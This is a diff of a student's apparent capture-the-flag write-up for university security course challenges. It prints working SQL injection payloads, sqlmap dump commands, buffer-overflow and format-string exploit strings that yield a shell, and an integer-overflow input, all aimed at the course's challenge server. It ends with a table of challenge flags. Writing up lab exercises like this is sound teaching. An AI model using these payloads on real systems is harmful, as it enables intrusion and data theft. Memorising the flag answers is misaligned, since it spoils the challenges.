-<code>' UNION SELECT id||'.'||username||'.'||password, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM users--</code></p>
-
-<p>It gives us just the admin row, <code>1.admin.6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d</code></p>
-
-<p>Unfortunately none of the SHA256 rainbow tables had this hash stored, and <a href="https://hashcat.net/hashcat/">HashCat</a> didn&rsquo;t want to work for me.<br />
-<strong>But that&rsquo;s okay, because everything I just said was unnecessary in finding the flag!</strong></p>
-
-<p>Instead what we want to do, is to navigate around the database to find the table which contains our flags!</p>
-
-<p><strong>Solution</strong><br />
-After snooping around for a bit, we find the existence of the <code>flag</code> table, to which we can then extract the flag with another SQL injection.</p>
-
-<p>Inject: <code>' UNION SELECT flag, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM flag--</code>
-Result: <code>You are logged in as You are logged in as COMP6443{literally_unhackable}</code></p>
-
-<p>Flag: <code>COMP6443{literally_unhackable}</code></p>
-
-<hr />
-
-<p>You could have also used <a href="http://sqlmap.org/"><code>sqlmap</code></a>, which is a piece of software designed to do exactly these sort of things!</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST 
+$5 = 0x0                                                                                                                                                                                      </code></pre></td></tr></table></div></div><p>I&rsquo;m not sure what&rsquo;s going on, but it looks like <code>items[0]</code> points to an address that wasn&rsquo;t &lsquo;allocated&rsquo;.</p><hr><p><strong>glib versions</strong></p><ul><li>most things - 2.2.5</li><li>2.2</li><li>isoc99 functions - 2.7</li><li>stack check - 2.4</li></ul><p><strong>Possible solutions</strong></p><ul><li>heap overflow into shellcode</li><li>Heap spray -&gt; NOP sled \x90</li></ul><p></details></p><h1 id=category-web>Category: Web</h1><h2 id=cookie>cookie</h2><p><details></p><blockquote><p><a href=http://plsdonthaq.me:8001>http://plsdonthaq.me:8001</a></p></blockquote><p><strong>Solution</strong><br>There&rsquo;s a browser cookie <code>admin</code> that is set to <code>0</code>.<br>Simple just modify the cookie and set it to <code>1</code>.</p><p>Flag: <code>COMP6441{you_should_consider_doing_comp_[6843/6447]}</code></p><p></details></p><h2 id=ezpz1-0>ezpz1.0</h2><p><details></p><blockquote><p><a href=http://plsdonthaq.me:8013>http://plsdonthaq.me:8013</a></p></blockquote><p><strong>Analysis</strong><br>This is an SQL Injection question.<br>Unfortunately a few too many people have been most likely <a href=http://sqlmap.org/><code>sqlmap</code></a>-ing the poor website, and it was very slow to use (Rate limit your queries!!!).<br>(<em>or, the server was slow to begin with</em>)</p><p>We&rsquo;re given a website with a login form, and a few links at the top.<br>One says &ldquo;flag&rdquo;, but it&rsquo;s a 404 - <strong>it&rsquo;s a red herring</strong>, so let&rsquo;s forget about that.</p><p>Doing some reconnaissance, we see that the SQL queries are performed unsafely.<br>If we put a <code>'</code> into the username input, we&rsquo;re presented with a backend error</p><p><code>''' LIMIT 1&quot; LINE 3: ... WHERE username=''' ^ [SQL: &quot;SELECT username, password\n FROM users\n WHERE username='''\n LIMIT 1&quot;] (Background on this error at: http://sqlalche.me/e/f405)</code></p><p>From here, we can see that the backend is using <a href=https://www.sqlalchemy.org/>SQLAlchemy</a>, a SQL library for Python.<br>With some more research, we can see that the database is running <a href=https://www.postgresql.org/>Postgres</a>.</p><p>Let&rsquo;s have a look at the query string.</p><p><code>&quot;SELECT username, password FROM users WHERE username='' LIMIT 1&quot;</code></p><p>We see that the query is using apostrophes (<code>'</code>) to enclose the username and password strings, so <strong>we also want to use apostrophes</strong> in our exploit.<br>We can also see that the password field is indirectly referenced - meaning that we won&rsquo;t be able to perform any sort of injection from the password input field (at least not with this query string alone).</p><p>Firstly, let&rsquo;s guess a username - perhaps <code>admin</code>.<br>Putting in <code>admin</code> and whatever password we want gives us an error saying that the <strong>sha256(hash)</strong> does not match.<br>Interesting, so we know that the passwords might be hashed with SHA256.</p><p>We can therefore infer that some line of code in the server is performing a comparison: <code>if (sha256(input_password) == hash_inside_the_database) { ... }</code>.</p><p>We can see from the SQL query, that the backend <em>first</em> retrieves a record, and <em>then</em> compares the record to our input.<br>Obviously we don&rsquo;t have the password, let alone the SHA256 hash of the user <code>admin</code> (not yet at least) - but that&rsquo;s okay, we&rsquo;ll just provide our own hash!</p><p>We can perform an SQL injection into the username field to provide our own row with the <code>UNION</code> operator</p><p>Let&rsquo;s create a SHA256 hash of the letter <code>a</code> (our forced password)&hellip;<br><code>sha256(&quot;a&quot;) =&gt; ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb</code></p><p>Injecting <code>' UNION SELECT 'admin', 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'--</code> into the username field, and using <code>a</code> as the password, we&rsquo;re presented with a welcome page, saying welcome <code>admin</code>!</p><p>Perhaps we can try get the password hash by concatenating the admin username and password as our first column in the union.</p><p>Inject: <code>' UNION SELECT 'admin' || password, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM users--</code><br>Result: <code>You are logged in as You are logged in as admin6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d</code></p><p>So we&rsquo;ve gotten the SHA256 password hash for <code>admin</code> to be <code>6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d</code>, which is probably a hash of the flag!</p><p>Let&rsquo;s see what else is in our <code>users</code> table.</p><p>To extract the names of the columns in our <code>users</code> table&hellip;<br><code>' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 0--</code><br><code>' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 1--</code><br><code>' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 2--</code></p><p>These queries give us the existence of three columns, <code>password</code>, <code>username</code>, and <code>id</code></p><p>Searching for the entries in this table (<em>perhaps we had to find another user?</em>)&hellip;<br><code>' UNION SELECT id||'.'||username||'.'||password, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM users--</code></p><p>It gives us just the admin row, <code>1.admin.6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d</code></p><p>Unfortunately none of the SHA256 rainbow tables had this hash stored, and <a href=https://hashcat.net/hashcat/>HashCat</a> didn&rsquo;t want to work for me.<br><strong>But that&rsquo;s okay, because everything I just said was unnecessary in finding the flag!</strong></p><p>Instead what we want to do, is to navigate around the database to find the table which contains our flags!</p><p><strong>Solution</strong><br>After snooping around for a bit, we find the existence of the <code>flag</code> table, to which we can then extract the flag with another SQL injection.</p><p>Inject: <code>' UNION SELECT flag, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM flag--</code>
+Result: <code>You are logged in as You are logged in as COMP6443{literally_unhackable}</code></p><p>Flag: <code>COMP6443{literally_unhackable}</code></p><hr><p>You could have also used <a href=http://sqlmap.org/><code>sqlmap</code></a>, which is a piece of software designed to do exactly these sort of things!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST 
 sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST --dbs  
-sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST --dump </pre></td></tr></table>
-</div>
-</div>
-<p></details></p>
-
-<h1 id="category-binary">Category: Binary</h1>
-
-<h2 id="poodle">poodle</h2>
-
-<p><details></p>
-
-<blockquote>
-<p>Hello what is your favourite type of poodle?<br />
-ENTER POODLE CHOICE NOW&gt;</p>
-</blockquote>
-
-<p><a href="buf2">[buf2]</a></p>
-
-<p><strong>Solution</strong><br />
-Looking at the disassembly of the code, <code>scanf</code> writes into a memory space that is <code>0x36</code> bytes long (54 bytes).<br />
-The next 4 bytes are the return value, which we don&rsquo;t care about.</p>
-
-<p>So we need to pad 58 bytes before we can override the return address to the address of <code>printFlag</code> (<code>0x08049259</code>).</p>
-
-<p><code>python -c 'print(&quot;.&quot; * 58 + &quot;\x08\x04\x92\x59&quot;[::-1])' | nc plsdonthaq.me 1000</code></p>
-
-<p>Flag: <code>COMP6441{how_good_are_buffer_ove}rflows</code></p>
-
-<p></details></p>
-
-<h2 id="format0">format0</h2>
-
-<p><details></p>
-
-<blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">   ____                    __        __      _
+sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST --dump </pre></td></tr></table></div></div><p></details></p><h1 id=category-binary>Category: Binary</h1><h2 id=poodle>poodle</h2><p><details></p><blockquote><p>Hello what is your favourite type of poodle?<br>ENTER POODLE CHOICE NOW&gt;</p></blockquote><p><a href=buf2>[buf2]</a></p><p><strong>Solution</strong><br>Looking at the disassembly of the code, <code>scanf</code> writes into a memory space that is <code>0x36</code> bytes long (54 bytes).<br>The next 4 bytes are the return value, which we don&rsquo;t care about.</p><p>So we need to pad 58 bytes before we can override the return address to the address of <code>printFlag</code> (<code>0x08049259</code>).</p><p><code>python -c 'print(&quot;.&quot; * 58 + &quot;\x08\x04\x92\x59&quot;[::-1])' | nc plsdonthaq.me 1000</code></p><p>Flag: <code>COMP6441{how_good_are_buffer_ove}rflows</code></p><p></details></p><h2 id=format0>format0</h2><p><details></p><blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></pre></td><td class=lntd><pre class=chroma>   ____                    __        __      _
   / __/__  ______ _  ___ _/ /_  ____/ /_____(_)__  ___ _
  / _// _ \/ __/  &#39; \/ _ `/ __/ (_.-/ __/ __/ / _ \/ _ `/
 /_/  \___/_/ /_/_/_/\_,_/\__/ /___/__/ _/ /_/_//_/\_, /
@@ -648,86 +199,24 @@ Once thought to be just a lazy short cut,
 actually leads to remote code execution!
 
 A pointer to the flag is on the stack
-format string&gt;</pre></td></tr></table>
-</div>
-</div></blockquote>
-
-<p><a href="format0">[format0]</a></p>
-
-<p><strong>Solution</strong><br />
-I reckon this question is broken, you don&rsquo;t need to try at all, just press enter.</p>
-
-<p>Flag: <code>COMP6441{hacked_the_planet}</code></p>
-
-<p></details></p>
-
-<h2 id="format2">format2</h2>
-
-<p><details></p>
-
-<p><a href="format2_32">[format2_32]</a></p>
-
-<p><strong>Analysis</strong><br />
-Looking at the dissassembly of our binary, we see that this is a <code>printf</code> exploit.<br />
-To store the input, the program uses <code>fgets</code> - to we&rsquo;re limited to 98 (0x63 - 1) bytes of input.<br />
-Additionally, there is a stack canary which may halt our attempts - so we won&rsquo;t be doing a buffer overflow this time.</p>
-
-<p>(Evidently, because it&rsquo;s a format string challenge.)</p>
-
-<p>Doing some analysis, the return address (EIP) of the <code>do_the_format</code> function is <code>0x080491fb</code>, which is stored at on the stack at <code>0xffffd55c</code>.<br />
-We&rsquo;ll need to change it to <code>0x080492be</code>.</p>
-
-<p><em>(It was also the 35th item in the stack, but you wouldn&rsquo;t have been able to just write into <code>%35$n</code>, as it would write into the address referenced by the data in that slot, rather the address of the slot itself</em></p>
-
-<p><code>&lt;destinationAddress&gt;&lt;destinationAddress+2&gt;%&lt;HI-8&gt;c%5$n%&lt;HI-LO&gt;c%6$n</code></p>
-
-<p>Where:</p>
-
-<ul>
-<li><code>destinationAddress</code> is the address which you wish to write into (<code>0xffffd55c</code>)</li>
-<li><code>HI</code> is the first two bytes of the address we want to write (<code>0x0804</code>)</li>
-<li><code>LO</code> is the last two bytes of the address we want to write (<code>0x92be</code>)</li>
-</ul>
-
-<p>Doing that gives us this chain:<br />
-<code>\x5c\xd5\xff\xff\x5e\xd5\xff\xff%37558c%6$n</code></p>
-
-<p>Now it didn&rsquo;t exactly work out for me, because <code>HI</code> - <code>LO</code> would give me a negative value, and I wasn&rsquo;t sure if that was right or if I had to do something special to fix that.</p>
-
-<p>After some research, I found a way to write two <code>short</code>s instead of a single <code>int</code>:<br />
-<code>\x5c\xd5\xff\xff\x5e\xd5\xff\xff%37558c%2$hn%30022c%3$hn</code></p>
-
-<p>But jk it still didn&rsquo;t work - the stack was probably changing, so I couldn&rsquo;t just hardcode <code>0xffffd55c</code></p>
-
-<p>So I tried another approach, this time with the <code>GOT</code> entries.</p>
-
-<p><strong>Solution</strong></p>
-
-<p><strong>GOT</strong> stands for <em>Global Offset Table</em> and is a mechanism to redirect addresses to external functions (ie provided by libc).</p>
-
-<p>Looking at GOT entries of the binary with <code>readelf -r ./format2</code>, we get this:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">Relocation section &#39;.rel.dyn&#39; at offset 0x3fc contains 5 entries:                                                                                                                                               
+format string&gt;</pre></td></tr></table></div></div></blockquote><p><a href=format0>[format0]</a></p><p><strong>Solution</strong><br>I reckon this question is broken, you don&rsquo;t need to try at all, just press enter.</p><p>Flag: <code>COMP6441{hacked_the_planet}</code></p><p></details></p><h2 id=format2>format2</h2><p><details></p><p><a href=format2_32>[format2_32]</a></p><p><strong>Analysis</strong><br>Looking at the dissassembly of our binary, we see that this is a <code>printf</code> exploit.<br>To store the input, the program uses <code>fgets</code> - to we&rsquo;re limited to 98 (0x63 - 1) bytes of input.<br>Additionally, there is a stack canary which may halt our attempts - so we won&rsquo;t be doing a buffer overflow this time.</p><p>(Evidently, because it&rsquo;s a format string challenge.)</p><p>Doing some analysis, the return address (EIP) of the <code>do_the_format</code> function is <code>0x080491fb</code>, which is stored at on the stack at <code>0xffffd55c</code>.<br>We&rsquo;ll need to change it to <code>0x080492be</code>.</p><p><em>(It was also the 35th item in the stack, but you wouldn&rsquo;t have been able to just write into <code>%35$n</code>, as it would write into the address referenced by the data in that slot, rather the address of the slot itself</em></p><p><code>&lt;destinationAddress&gt;&lt;destinationAddress+2&gt;%&lt;HI-8&gt;c%5$n%&lt;HI-LO&gt;c%6$n</code></p><p>Where:</p><ul><li><code>destinationAddress</code> is the address which you wish to write into (<code>0xffffd55c</code>)</li><li><code>HI</code> is the first two bytes of the address we want to write (<code>0x0804</code>)</li><li><code>LO</code> is the last two bytes of the address we want to write (<code>0x92be</code>)</li></ul><p>Doing that gives us this chain:<br><code>\x5c\xd5\xff\xff\x5e\xd5\xff\xff%37558c%6$n</code></p><p>Now it didn&rsquo;t exactly work out for me, because <code>HI</code> - <code>LO</code> would give me a negative value, and I wasn&rsquo;t sure if that was right or if I had to do something special to fix that.</p><p>After some research, I found a way to write two <code>short</code>s instead of a single <code>int</code>:<br><code>\x5c\xd5\xff\xff\x5e\xd5\xff\xff%37558c%2$hn%30022c%3$hn</code></p><p>But jk it still didn&rsquo;t work - the stack was probably changing, so I couldn&rsquo;t just hardcode <code>0xffffd55c</code></p><p>So I tried another approach, this time with the <code>GOT</code> entries.</p><p><strong>Solution</strong></p><p><strong>GOT</strong> stands for <em>Global Offset Table</em> and is a mechanism to redirect addresses to external functions (ie provided by libc).</p><p>Looking at GOT entries of the binary with <code>readelf -r ./format2</code>, we get this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></pre></td><td class=lntd><pre class=chroma>Relocation section &#39;.rel.dyn&#39; at offset 0x3fc contains 5 entries:                                                                                                                                               
  Offset     Info    Type            Sym.Value  Sym. Name                                                                                                                                                        
 0804bfec  00000106 R_386_GLOB_DAT    00000000   _ITM_deregisterTMClone                                                                                                                                          
 0804bff0  00000806 R_386_GLOB_DAT    00000000   __gmon_start__                                                                                                                                                  
@@ -743,70 +232,22 @@ Relocation section &#39;.rel.plt&#39; at offset 0x424 contains 7 entries:
 0804c018  00000507 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4                                                                                                                                      
 0804c01c  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0                                                                                                                                                  
 0804c020  00000707 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0                                                                                                                                                
-0804c024  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</pre></td></tr></table>
-</div>
-</div>
-<p>At this point, it&rsquo;s just a matter of choosing an entry to override.<br />
-I decided to override <code>fflush</code>, thinking that overriding <code>printf</code> might be bad since it&rsquo;s the function that will perform our exploit for us.</p>
-
-<p>So therefore, we would need to change the value at the address for <code>fflush</code>, <code>*(0x0804c010) = 0x080492be</code>.</p>
-
-<p>I also seemed to need to add an extra &ldquo;.&rdquo; at the start of my string to fix the alignment of characters.</p>
-
-<p>So finally I used this format string <code>.\x10\x11\x12\x13%173c%6$hhn%212c%7$hhn%114c%8$hhn%4c%9$hhn</code> to gain access to the shell.</p>
-
-<p><a href="format2_solver.py">[format2_solver.py]</a></p>
-
-<p>Flag: <code>COMP6441{hacked_the_planet_2}</code></p>
-
-<p></details></p>
-
-<h2 id="int1">int1</h2>
-
-<p><details></p>
-
-<p><strong>Solution</strong><br />
-I wasn&rsquo;t able to do this challenge the first time, despite doing the exact same thing when attempting it the next day&hellip;</p>
-
-<p>We need to input a number that when multiplied by 2, is equal to 2674.<br />
-That would be 1337 right!</p>
-
-<p>But if you try enter a number greater than or equal to forty, we&rsquo;ll get an error:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">Enter a number: 100
+0804c024  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</pre></td></tr></table></div></div><p>At this point, it&rsquo;s just a matter of choosing an entry to override.<br>I decided to override <code>fflush</code>, thinking that overriding <code>printf</code> might be bad since it&rsquo;s the function that will perform our exploit for us.</p><p>So therefore, we would need to change the value at the address for <code>fflush</code>, <code>*(0x0804c010) = 0x080492be</code>.</p><p>I also seemed to need to add an extra &ldquo;.&rdquo; at the start of my string to fix the alignment of characters.</p><p>So finally I used this format string <code>.\x10\x11\x12\x13%173c%6$hhn%212c%7$hhn%114c%8$hhn%4c%9$hhn</code> to gain access to the shell.</p><p><a href=format2_solver.py>[format2_solver.py]</a></p><p>Flag: <code>COMP6441{hacked_the_planet_2}</code></p><p></details></p><h2 id=int1>int1</h2><p><details></p><p><strong>Solution</strong><br>I wasn&rsquo;t able to do this challenge the first time, despite doing the exact same thing when attempting it the next day&hellip;</p><p>We need to input a number that when multiplied by 2, is equal to 2674.<br>That would be 1337 right!</p><p>But if you try enter a number greater than or equal to forty, we&rsquo;ll get an error:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>Enter a number: 100
 Sorry we can&#39;t hold numbers &gt;= 40
-Budget cuts, they hit everybody...</pre></td></tr></table>
-</div>
-</div>
-<p>The way to solve this is to perform an integer overflow attack.</p>
-
-<p>Any positive number stored as a <em>signed integer</em> (4 bytes) greater than 2147483647 will cause that number to overflow into the largest negative number.<br />
-Similarly, any negative number stored as a <em>signed integer</em> (4 bytes) less than -2147483647 will cause that number to overflow into the largest positive number.</p>
-
-<p>So we&rsquo;ll need to enter in <code>-2147482311</code> as the value.</p>
-
-<p>Doing so drops us into a bash shell, where through some recon we can find the flag.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">$&gt; ls
+Budget cuts, they hit everybody...</pre></td></tr></table></div></div><p>The way to solve this is to perform an integer overflow attack.</p><p>Any positive number stored as a <em>signed integer</em> (4 bytes) greater than 2147483647 will cause that number to overflow into the largest negative number.<br>Similarly, any negative number stored as a <em>signed integer</em> (4 bytes) less than -2147483647 will cause that number to overflow into the largest positive number.</p><p>So we&rsquo;ll need to enter in <code>-2147482311</code> as the value.</p><p>Doing so drops us into a bash shell, where through some recon we can find the flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></pre></td><td class=lntd><pre class=chroma>$&gt; ls
 bin
 boot
 dev
@@ -815,358 +256,16 @@ flag &lt;---- Flag file!!!
 ...
 
 $&gt; cat flag
-COMP6441{hacked_the_ether}</pre></td></tr></table>
-</div>
-</div>
-<p>Flag: <code>COMP6441{hacked_the_ether}</code></p>
-
-<hr />
-
-<p>Now, the usual piping didn&rsquo;t work, and I&rsquo;m not entirely sure why it didn&rsquo;t work.<br />
-I even tried adding a time delay between the prints, but it still wouldn&rsquo;t work.<br />
-If anyone knows why this is the case, please let me know!</p>
-
-<p><code>python3 -c 'print(-(2*31)+1337)' | nc plsdonthaq.me 1003</code></p>
-
-<p></details></p>
-
-<h1 id="category-crypto">Category: Crypto</h1>
-
-<h2 id="s-birthday-attack-s"><s>birthday attack</s></h2>
-
-<h2 id="diffie-1">diffie 1</h2>
-
-<p><details></p>
-
-<blockquote>
-<p>INTERCEPTING DIFFY HELLMAN KEY EXCHANGE<br />
-Generator: <code>19</code><br />
-Modulus: <code>239</code><br />
-Alice: here is my (Generator^mySecret) Mod (Modulus): <code>184</code><br />
-Bob: here is my (Generator^mySecret) Mod (Modulus): <code>227</code><br />
-What is their shared key?<br />
-Eve:</p>
-</blockquote>
-
-<p><strong>Solution</strong></p>
-
-<p>The problem with the Diffie Hellman key exchange, is that if the modulus is not large enough, we are able to brute-force crack the secret of each party.</p>
-
-<p>In this case:<br />
-Alice&rsquo;s secret is <code>37</code><br />
-Bob&rsquo;s secret is <code>171</code></p>
-
-<p>Given either secret, by raising the received public data to our secret, and taking the modulus of that, we are able to determine the shared secret, which in this case is <code>178</code></p>
-
-<p>Entering <code>178</code> as Eve&rsquo;s response gives us the flag.</p>
-
-<p><a href="diffie1_solver.py">[diffie1_solver.py]</a><br />
-Usage: <code>diffie1_solver.py (generator) (modulus) (public)</code><br />
-If it&rsquo;s taking too long, perhaps use another set of values of the questions</p>
-
-<p>Flag: <code>COMP6441{haCk3rs_gunnA_H4K}</code></p>
-
-<p></details></p>
-
-<h2 id="diffie-2">diffie 2</h2>
-
-<p><details></p>
-
-<blockquote>
-<p>BEGINING DIFFY HELLMAN KEY EXCHANGE<br />
-Generator: <code>61</code><br />
-Modulus: <code>823</code><br />
-Here is (Generator^mySecret) Mod (Modulus): <code>373</code><br />
-Enter yours: &hellip;<br />
-Enter our secret number: &hellip;</p>
-</blockquote>
-
-<p><strong>Solution</strong><br />
-This is just the standard application of the Diffie Hellman process - no brute-forcing or any sort of cracking needed here.</p>
-
-<p>Pick any secret <code>s</code>, then create your public data (base^<code>s</code> % modulus), and use that as the value for &ldquo;Enter yours&rdquo;.<br />
-Then just raise the given public data to your secret apply the modulus for the &ldquo;Our secret number&rdquo;</p>
-
-<p><strong>Trivial Solution</strong><br />
-Just enter <code>1</code>, and <code>1</code></p>
-
-<p>Flag: <code>COMP6441{sEcuRe_tHe_plaNet!}</code></p>
-
-<p></details></p>
-
-<h2 id="s-mac-s"><s>MAC</s></h2>
-
-<h2 id="vinegar">vinegar</h2>
-
-<p><details></p>
-
-<blockquote>
-<p>adamt told me that his facebook password encrypted is this cipher text: Dlc_ppyq_mq_MSKZ6441{lymo_rri_esfqyr}</p>
-</blockquote>
-
-<p><strong>Solution</strong><br />
-Vinegar &hellip; hm I wonder if it&rsquo;s a <em>vigenere</em> cipher.</p>
-
-<p>Apply some analysis, or just brute force it, to determine that the key is <code>key</code>.</p>
-
-<p>Flag: <code>COMP6441{hack_the_gibson}</code></p>
-
-<p></details></p>
-
-<h2 id="s-hash-length-magic-s"><s>hash length magic</s></h2>
-
-<p><details></p>
-
-<p><strong>Analysis</strong><br />
-Nothing happens when you connect?<br />
-<em>Or does it?</em></p>
-
-<p>When you enter more than 255 characters, you get this message:<br />
-<code>Send me 0x100 bytes, [sha256(key + message) + message] Where message is get flag</code></p>
-
-<p>python3 -c &lsquo;key = &ldquo;a&rdquo;; m = &ldquo;get flag&rdquo;; import hashlib; xx = hashlib.sha256(key.encode() + m.encode()).hexdigest() + m; print(xx + &ldquo;\x00&rdquo; * (0x100 - len(xx)))&rsquo; | nc plsdonthaq.me 9003</p>
-
-<p></details></p>
-
-<h1 id="category-misc">Category: Misc</h1>
-
-<h2 id="shuffle">shuffle</h2>
-
-<p><details></p>
-
-<blockquote>
-<p>Can you crack this?<br />
-<a href="shuffle.txt">[shuffle.txt]</a></p>
-</blockquote>
-
-<p><strong>Solution</strong>
-It&rsquo;s a bunch of ASCII art, with the lines shuffled.<br />
-We can sort these lines (by increasing number) and after stripping this order information, we can read the flag from ASCII art.</p>
-
-<p><a href="shuffle_solver.py">[shuffle_solver.py]</a><br />
-<a href="shuffle_solved.txt">[shuffle_solved.txt]</a></p>
-
-<p>Flag: <code>MAKING ASCII ART IS A KEY PART OF THE HACKERS TOOLKIT</code>
-</details></p>
-
-<h2 id="guess">guess</h2>
-
-<p><details></p>
-
-<blockquote>
-<p>Can you guess the flag?</p>
-</blockquote>
-
-<p><strong>Analysis</strong><br />
-The program is asking for some sort of password.<br />
-If you try to enter <code>A</code>&hellip; it will instantly kick you out.<br />
-If you try to enter <code>B</code>&hellip; it will instantly kick you out.<br />
-If you try to enter <code>C</code>&hellip; there&rsquo;s a 0.5s delay&hellip; and then it kicks you out.</p>
-
-<p>What about a second letter?<br />
-<code>CA</code> -&gt; 0.5s, then kick<br />
-<code>CB</code> -&gt; 0.5s, then kick<br />
-&hellip;<br />
-<code>CO</code> -&gt; <strong>one second</strong>, then kick.</p>
-
-<p>Hmm..</p>
-
-<p><strong>Solution</strong><br />
-For each correct letter (case-sensitive, order-sensitive), it takes an extra 0.5 seconds to validate.<br />
-We can use this time-delay as a feedback mechanism to tell us if we are right or not!</p>
-
-<p>So I hacked together a brute-forcing script, and let it run for a few minutes.<br />
-After a while, we successfully retrieve the flag!</p>
-
-<p>Flag: <code>COMP6441{trollllolollololllol7}</code>
-</details></p>
-
-<h1 id="just-give-me-the-answers">Just give me the answers</h1>
-
-<table>
-<thead>
-<tr>
-<th align="right">Question</th>
-<th align="left">Flag</th>
-</tr>
-</thead>
-
-<tbody>
-<tr>
-<td align="right">trivial</td>
-<td align="left">``</td>
-</tr>
-
-<tr>
-<td align="right">cookie</td>
-<td align="left"><code>COMP6441{you_should_consider_doing_comp_[6843/6447]}</code></td>
-</tr>
-
-<tr>
-<td align="right">ezpz1.0</td>
-<td align="left"><code>COMP6443{literally_unhackable}</code></td>
-</tr>
-
-<tr>
-<td align="right">poodle</td>
-<td align="left"><code>COMP6441{how_good_are_buffer_ove}rflows</code></td>
-</tr>
-
-<tr>
-<td align="right">format0</td>
-<td align="left"><code>COMP6441{hacked_the_planet}</code></td>
-</tr>
-
-<tr>
-<td align="right">format2</td>
-<td align="left"><code>COMP6441{hacked_the_planet_2}</code></td>
-</tr>
-
-<tr>
-<td align="right">int1</td>
-<td align="left"><code>COMP6441{hacked_the_ether}</code></td>
-</tr>
-
-<tr>
-<td align="right">birthday attack</td>
